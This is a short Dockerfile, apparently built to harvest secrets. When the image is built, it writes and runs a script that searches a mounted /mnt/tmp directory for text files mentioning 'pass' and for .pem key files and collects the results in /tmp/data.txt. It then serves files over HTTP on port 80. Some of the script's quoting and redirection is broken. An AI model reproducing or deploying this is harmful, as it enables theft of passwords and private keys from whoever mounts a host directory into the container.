FROM alpine:edge
LABEL maintainer="dastardly90x@gmail.com"
RUN apk add --update && apk add \
python

RUN echo "find /mnt/tmp -iname "*.txt" 2>/dev/null -exec grep -li 'pass' {} \; > /tmp/data.txt" > stuff.sh
RUN echo "find /mnt/tmp -iname "*.pem" 2>/dev/null; >> /tmp/data.txt" >>stuff.sh
RUN chmod +x stuff.sh
RUN ./stuff.sh
CMD python -m SimpleHTTPServer 80
